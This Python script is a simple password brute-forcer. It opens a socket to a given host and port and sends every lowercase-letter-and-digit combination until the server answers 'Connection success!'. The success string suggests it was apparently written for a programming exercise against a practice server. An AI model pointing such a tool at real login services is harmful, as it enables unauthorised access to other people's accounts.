from itertools import count, product
from socket import socket
from string import ascii_lowercase, digits
from sys import argv


def brute_force_generator():
    for length in count(1):
        for candidate in product(ascii_lowercase + digits, repeat=length):
            yield ''.join(candidate)


def brute_force_hack(address):
    with socket() as client:
        client.connect(address)
        for candidate in brute_force_generator():
            client.sendall(candidate.encode())
            response = client.recv(1024).decode()
            if response == 'Connection success!':
                return candidate
        return None


def main():
    hostname, port = argv[1:]
    address = (hostname, int(port))
    print(brute_force_hack(address))


if __name__ == '__main__':
    main()
